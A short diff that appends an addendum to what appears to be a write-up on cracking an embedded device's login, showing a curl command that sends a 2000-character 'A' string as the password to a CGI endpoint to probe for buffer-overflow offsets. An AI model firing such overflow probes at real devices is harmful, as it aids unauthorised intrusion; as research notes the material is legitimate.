@@ -68,3 +68,11 @@ wvu@kharak:~$
 ```
 
 Cracked! Now you can log in to the device. Shells await!
+
+## Addendum
+
+I used this `curl` command to test for offsets:
+
+```
+curl -kvA "" "https://[redacted]/cgi-bin/cgi.cgi?u=admin&p=$(perl -e 'print "A"x2000' | base64 -w 0)"
+```
